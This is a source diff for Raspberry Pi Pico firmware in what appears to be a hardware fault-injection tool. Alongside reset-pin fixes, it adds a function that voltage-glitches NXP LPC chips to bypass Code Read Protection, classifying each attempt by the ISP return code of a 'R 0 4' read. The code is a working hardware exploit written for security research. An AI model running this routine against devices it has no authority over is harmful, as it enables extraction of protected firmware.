@@ -1223,14 +1223,15 @@ void target_reset_config(uint8_t pin, uint32_t period_ms, bool active_high) {
     // Only initialize GPIO if pin or polarity changed
     if (pin_changed || polarity_changed) {
         gpio_init(reset_pin);
-        gpio_set_dir(reset_pin, GPIO_OUT);
-
-        // Disable pull resistors to avoid interfering with edge detection
+        // Inactive state = HIGH-Z (input). Lets the target's own pull on nRST
+        // hold the line in the inactive state without the Pico actively
+        // driving it. Critical here because driving HIGH leaked 3.3 V onto
+        // the JTAG TREF net through a board-side resistor path, ruining the
+        // ADC probe. With the pin floating, the target's internal pull-up
+        // takes over and TREF stays clean.
+        gpio_set_dir(reset_pin, GPIO_IN);
         gpio_disable_pulls(reset_pin);
 
-        gpio_put(reset_pin, reset_active_high ? 0 : 1);  // Inactive state
-
-        // Critical: After Pico reboot, reset pin may have been floating/LOW
         // Give target time to come out of reset before first reset pulse
         sleep_ms(100);
 
@@ -1245,10 +1246,14 @@ void target_reset_config(uint8_t pin, uint32_t period_ms, bool active_high) {
 }
 
 void target_reset_execute(void) {
-    // Pulse reset pin
+    // Pulse reset pin. Drive only during the active phase, return to
+    // high-Z afterward so the target's own pull on nRST owns the line at
+    // idle (avoids leakage onto JTAG TREF).
+    gpio_set_dir(reset_pin, GPIO_OUT);
     gpio_put(reset_pin, reset_active_high ? 1 : 0);  // Active state
     sleep_ms(reset_period_ms);
-    gpio_put(reset_pin, reset_active_high ? 0 : 1);  // Inactive state
+    gpio_set_dir(reset_pin, GPIO_IN);                // Inactive = float
+    gpio_disable_pulls(reset_pin);
 
     uart_cli_send("OK: Target reset executed\r\n");
 }
@@ -1371,8 +1376,11 @@ typedef struct {
 } glitch_result_t;
 
 // Execute a single power glitch: drive power low, ADC-gate to threshold,
-// restore, monitor nRST.
-static void power_glitch_once(uint32_t thresh, uint16_t *adc_log,
+// optionally dwell past threshold for min_width_us, restore, monitor nRST.
+// If min_width_us > 0 the rail is held LOW for at least that long even
+// after the ADC reads <= thresh (lets the core caps actually discharge).
+static void power_glitch_once(uint32_t thresh, uint32_t min_width_us,
+                              uint16_t *adc_log,
                               uint32_t adc_log_size, uint32_t *adc_log_count_out,
                               glitch_result_t *result) {
     result->thresh_reached = true;
@@ -1411,6 +1419,19 @@ static void power_glitch_once(uint32_t thresh, uint16_t *adc_log,
         if (time_us_64() - t0 > 500000) {
             result->thresh_reached = false;
             break;
+        }
+    }
+
+    // Optional dwell: keep rail LOW past threshold so core decoupling caps
+    // also drain. ADC keeps sampling so vmin_raw stays accurate.
+    if (min_width_us > 0 && result->thresh_reached) {
+        uint64_t dwell_end = t0 + min_width_us;
+        while (time_us_64() < dwell_end) {
+            uint16_t val = adc_read();
+            if (adc_log_count < adc_log_size)
+                adc_log[adc_log_count++] = val;
+            if (val < result->vmin_raw)
+                result->vmin_raw = val;
         }
     }
 
@@ -1656,7 +1677,7 @@ void target_power_sweep(void) {
 
         uint32_t adc_log_count = 0;
         glitch_result_t gr;
-        power_glitch_once(thresh, adc_log, ADC_LOG_SIZE, &adc_log_count, &gr);
+        power_glitch_once(thresh, 0, adc_log, ADC_LOG_SIZE, &adc_log_count, &gr);
 
         // Report glitch stats
         if (!gr.thresh_reached) {
@@ -1796,10 +1817,11 @@ void target_power_sweep(void) {
 
     // Ensure power is restored and reset pin back to normal
     gpio_set_mask(POWER_MASK);
+    // Reset pin back to high-Z inactive — target's pull on nRST owns the
+    // line so we don't leak onto JTAG TREF or other shared nets.
     gpio_init(reset_pin);
-    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_set_dir(reset_pin, GPIO_IN);
     gpio_disable_pulls(reset_pin);
-    gpio_put(reset_pin, reset_active_high ? 0 : 1);
 
     uart_cli_send("Sweep complete, power restored\r\n");
 }
@@ -1864,7 +1886,7 @@ void target_power_glitch(float voltage, uint32_t count) {
 
         uint32_t adc_log_count = 0;
         glitch_result_t gr;
-        power_glitch_once(thresh, adc_log, GLITCH_ADC_LOG, &adc_log_count, &gr);
+        power_glitch_once(thresh, 0, adc_log, GLITCH_ADC_LOG, &adc_log_count, &gr);
 
         if (!gr.thresh_reached) {
             total_timeout++;
@@ -1922,12 +1944,220 @@ void target_power_glitch(float voltage, uint32_t count) {
 
     // Restore
     gpio_set_mask(POWER_MASK);
+    // Reset pin back to high-Z inactive — target's pull on nRST owns the
+    // line so we don't leak onto JTAG TREF or other shared nets.
     gpio_init(reset_pin);
-    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_set_dir(reset_pin, GPIO_IN);
     gpio_disable_pulls(reset_pin);
-    gpio_put(reset_pin, reset_active_high ? 0 : 1);
 
     uart_cli_send("Glitch test complete, power restored\r\n");
+}
+
+// ----------------------------------------------------------------------------
+// LPC CRP-bypass via ADC-controlled VDD glitch (mirrors target_power_glitch
+// but uses ISP-side verification — no SWD/SRAM access on a CRP-locked LPC).
+//
+// Each attempt:
+//   1. power_glitch_once() drops VDD until ADC hits threshold, then restores
+//   2. wait for the chip to re-enter ISP
+//   3. target_enter_bootloader() — re-sync over UART1
+//   4. send "R 0 4\r\n" to LPC, parse the return code line
+//   5. classify:
+//        rc=0  → BYPASS (CRP defeated, ISP read succeeded)
+//        rc=19 → normal (CRP held)
+//        sync failed → effect (target left in weird state)
+//        no rc at all → effect (timeout)
+//
+// Prints one parseable line per attempt:
+//   [LPC GLITCH] attempt=N vmin=X.XXV bor=Y/N dur=Nus isp=normal|bypass|effect|sync_fail
+// ----------------------------------------------------------------------------
+void target_power_lpc_glitch(uint32_t count) {
+    // ---- guardrails ----
+    // After the v1 of this function bricked a Pico (likely via cap-discharge
+    // inrush through GP10/11/12 during repeated full-drop glitches), reject
+    // inputs that would either be no-ops or would stress the GPIO too hard.
+
+    // Glitch depth (VMIN, mV) and min-dwell (WIDTH cycles, converted to us)
+    // come from the unified glitch config — same knobs as a manual glitch.
+    glitch_config_t *gcfg = glitch_get_config();
+    if (gcfg->vmin_mv == 0) {
+        uart_cli_send("ERROR: VMIN is disabled. SET VMIN <mV> first.\r\n");
+        return;
+    }
+    float voltage = gcfg->vmin_mv / 1000.0f;
+    uint32_t dwell_us = gcfg->width_cycles / 150;
+
+    // NOTE: deliberately skip adc_power_init() / adc_gpio_init() / gpio_init.
+    // - adc_gpio_init() on RP2350 latches GP26 HIGH (confirmed bench bug).
+    // - gpio_init(26) sets SIO+input which RE-ENABLES the schmitt buffer,
+    //   loading the high-impedance probe and producing floating noisy
+    //   readings.
+    // The ADC CLI command works correctly by just calling adc_init() +
+    // adc_select_input() — the analog mux samples the pin regardless of
+    // digital pin function. Mirror that here.
+    adc_init();
+    adc_select_input(0);              // GP26 = ADC0 analog mux
+    power_ensure_init();
+
+    // Make sure power is on and let it stabilize before measuring idle.
+    gpio_set_mask(POWER_MASK);
+    sleep_ms(50);
+
+    // Average a small batch of ADC samples for a stable idle reading.
+    uint32_t sum = 0;
+    for (int i = 0; i < 16; i++) {
+        sum += adc_read();
+        sleep_us(100);
+    }
+    uint16_t idle_raw = (uint16_t)(sum / 16);
+    float idle_v = idle_raw * 3.3f / 4095.0f;
+    uart_cli_printf("Idle target VDD: %.3fV (ADC %u)\r\n", idle_v, idle_raw);
+
+    // Sanity 1: confirm we see *something* on GP26. If the probe is loose
+    // or target power is off we'd read ~0V and any sweep would never trigger
+    // power_glitch_once's threshold-reached path → infinite poll.
+    if (idle_raw < (uint16_t)(0.3f * 4095.0f / 3.3f)) {
+        uart_cli_printf("ERROR: idle %.2fV is too low. Confirm GP26 is on target VDD\r\n"
+                        "       (or a divider thereof) and target power is on. Refusing.\r\n",
+                        idle_v);
+        return;
+    }
+
+    // Sanity 2: requested VMIN must be meaningfully below idle. ≥ idle is
+    // a no-op; within 100 mV of idle is too shallow to be useful. Note:
+    // both numbers are in PROBE space — if there's a divider between the
+    // chip rail and GP26, scale VMIN accordingly.
+    if (voltage >= idle_v - 0.1f) {
+        uart_cli_printf("ERROR: VMIN %.2fV is not below idle %.2fV by at least 0.1V.\r\n"
+                        "       SET VMIN to a lower value. Refusing.\r\n",
+                        voltage, idle_v);
+        return;
+    }
+
+    // Sanity 3: cap count to keep a single CLI invocation bounded. Repeated
+    // brownouts in a tight loop are the most common way to brick the Pico
+    // (a la the v1 incident); keep ≤ 100 per call.
+    if (count == 0) count = 1;
+    if (count > 100) {
+        uart_cli_printf("Clamping count %lu → 100 (safety cap)\r\n", count);
+        count = 100;
+    }
+
+    uint32_t thresh = (uint32_t)(voltage * 4095.0f / 3.3f);
+    if (thresh > 4095) thresh = 4095;
+
+    uart_cli_printf("LPC CRP-bypass voltage glitch: VMIN=%.3fV (ADC %lu), %lu attempts, dwell=%luus\r\n",
+                    voltage, thresh, count, dwell_us);
+
+    uint32_t bypass = 0, normal_cnt = 0, effect_cnt = 0, sync_fail = 0;
+
+    for (uint32_t iter = 0; iter < count; iter++) {
+        // 1. ADC-controlled drop + dwell + restore.
+        glitch_result_t gr;
+        power_glitch_once(thresh, dwell_us, NULL, 0, NULL, &gr);
+        float vmin_v = gr.vmin_raw * 3.3f / 4095.0f;
+
+        // 2. Wait for chip to settle and start the boot ROM / ISP path.
+        sleep_ms(200);
+
+        // 3. Re-sync over UART1. target_enter_bootloader handles the
+        //    LPC ISP "?" + Synchronized + crystal kHz + A 1 sequence.
+        if (!target_enter_bootloader(115200, 12000)) {
+            sync_fail++;
+            uart_cli_printf("[LPC GLITCH] attempt=%lu vmin=%.2fV bor=%s dur=%luus isp=sync_fail\r\n",
+                            iter + 1, vmin_v,
+                            gr.nrst_went_low ? "Y" : "N",
+                            gr.glitch_us);
+            continue;
+        }
+
+        // 4. Send R 0 4 to the LPC and read its return code.
+        //    Format: command + \r\n. LPC echoes (because A 1 was set) then sends
+        //    rc on its own line, then data lines if rc=0.
+        const char *cmd = "R 0 4\r\n";
+        for (const char *p = cmd; *p; p++)
+            uart_putc_raw(TARGET_UART_ID, *p);
+        uart_tx_wait_blocking(TARGET_UART_ID);
+
+        // Read up to 4 lines (echo + rc + possibly data) into a buffer to scan.
+        char buf[128];
+        size_t pos = 0;
+        uint64_t deadline = time_us_64() + 1500000;
+        bool saw_lf = false;
+        int lf_count = 0;
+        while (pos < sizeof(buf) - 1 && time_us_64() < deadline) {
+            if (uart_is_readable(TARGET_UART_ID)) {
+                char c = (char)uart_getc(TARGET_UART_ID);
+                buf[pos++] = c;
+                if (c == '\n') {
+                    saw_lf = true;
+                    if (++lf_count >= 3) break;  // echo + rc + maybe one more
+                }
+            }
+        }
+        buf[pos] = '\0';
+
+        // 5. Find the rc line (first numeric token after the echo).
+        const char *result = "effect";
+        // Skip the echo (find first \n)
+        const char *rc_line = NULL;
+        for (size_t i = 0; i + 1 < pos; i++) {
+            if (buf[i] == '\n') { rc_line = &buf[i + 1]; break; }
+        }
+        if (rc_line) {
+            while (*rc_line == '\r' || *rc_line == ' ') rc_line++;
+            if (*rc_line >= '0' && *rc_line <= '9') {
+                int rc = atoi(rc_line);
+                if (rc == 19) {
+                    result = "normal";
+                    normal_cnt++;
+                } else if (rc == 0) {
+                    result = "bypass";
+                    bypass++;
+                } else {
+                    result = "effect";
+                    effect_cnt++;
+                }
+            } else {
+                effect_cnt++;
+            }
+        } else if (!saw_lf) {
+            // Nothing came back at all
+            effect_cnt++;
+        } else {
+            effect_cnt++;
+        }
+
+        uart_cli_printf("[LPC GLITCH] attempt=%lu vmin=%.2fV bor=%s dur=%luus isp=%s\r\n",
+                        iter + 1, vmin_v,
+                        gr.nrst_went_low ? "Y" : "N",
+                        gr.glitch_us, result);
+
+        // Full power cycle between shots so each attempt boots from a clean
+        // POR. Without this, the chip's state from a partial glitch carries
+        // forward — manifests as runs of consecutive sync_fails where the
+        // earlier shot got the chip stuck and subsequent shots can't recover.
+        // 100 ms off drains the rail past any internal POR threshold; 50 ms
+        // on lets the bootROM start ISP again before we re-sync.
+        gpio_clr_mask(POWER_MASK);
+        sleep_ms(100);
+        gpio_set_mask(POWER_MASK);
+        sleep_ms(50);
+    }
+
+    uart_cli_printf("\r\n=== LPC CRP-bypass summary (target=%.2fV) ===\r\n", voltage);
+    uart_cli_printf("  bypass:    %lu  *** flash readable ***\r\n", bypass);
+    uart_cli_printf("  normal:    %lu  (rc=19, CRP held)\r\n", normal_cnt);
+    uart_cli_printf("  effect:    %lu  (perturbed, no clean rc)\r\n", effect_cnt);
+    uart_cli_printf("  sync_fail: %lu  (could not re-enter ISP)\r\n", sync_fail);
+
+    // Restore power for next user activity
+    gpio_set_mask(POWER_MASK);
+    // Reset pin back to high-Z inactive — target's pull on nRST owns the
+    // line so we don't leak onto JTAG TREF or other shared nets.
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_disable_pulls(reset_pin);
 }
 
 // Upload payload to SRAM, set BOOT0/BOOT1 for SRAM boot, power glitch to reset
